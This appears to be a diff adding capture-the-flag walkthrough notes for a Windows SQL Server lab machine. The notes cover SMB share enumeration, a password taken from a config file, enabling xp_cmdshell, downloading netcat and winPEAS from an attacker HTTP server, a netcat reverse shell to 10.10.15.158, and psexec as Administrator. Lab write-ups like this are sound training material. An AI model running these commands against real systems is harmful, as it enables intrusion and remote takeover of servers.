@@ -1,0 +1,42 @@
+Which TCP port is hosting a database server?
+nmap -sC -sV -sT 10.129.103.181 -> 1433
+
+What is the name of the non-Administrative share available over SMB?
+smbclient -N --list=10.129.103.181
+
+What is the password identified in the file on the SMB share?
+smbclient -N \\\\10.129.103.181\\backups -> ls -> get prod.dtsConfig
+
+What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
+mssqlclient.py
+
+What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
+First connect: python ./mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.103.181 -windows-auth
+help -> xp_cmdshell
+
+What script can be used in order to search possible paths to escalate privileges on Windows hosts? winpeas
+
+What file contains the administrator's password?
+To run winpeas we first need a shell -> xp_cmdshell is disabled
+Enable it: EXEC sp_configure 'show advanced option', 1; -> RECONFIGURE; -> sp_configure; -> EXEC sp_configure 'xp_cmdshell', 1; -> RECONFIGURE;
+To get a shell we need nc64.exe: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+Setup server: sudo python3 -m http.server 80
+Setup listener: sudo nc -lvp 443
+Get the nc64.exe on the SQL Server: xp_cmdshell "powershell -c cd c:\users\sql_svc\Downloads; wget http://10.10.15.158/nc64.exe -outfile nc64.exe"
+Run nc64.exe: xp_cmdshell "powershell -c cd c:\users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.158 443"
+Now do the same for winpeas: wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+powershell wget http://10.10.15.158/winPEASx64.exe -outfile winPEASx64.exe
+.\winPEASx64.exe
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt gets spit out
+
+
+user flag:
+Search for a flag: dir "*.txt" /s
+cd Desktop
+type user.txt
+
+root flag:
+Get a new shell with the admin password: python ./psexec.py Administrator:MEGACORP_4dm1n!!@10.129.103.181
+Search for a flag: dir "*.txt" /s
+cd Desktop
+type root.txt
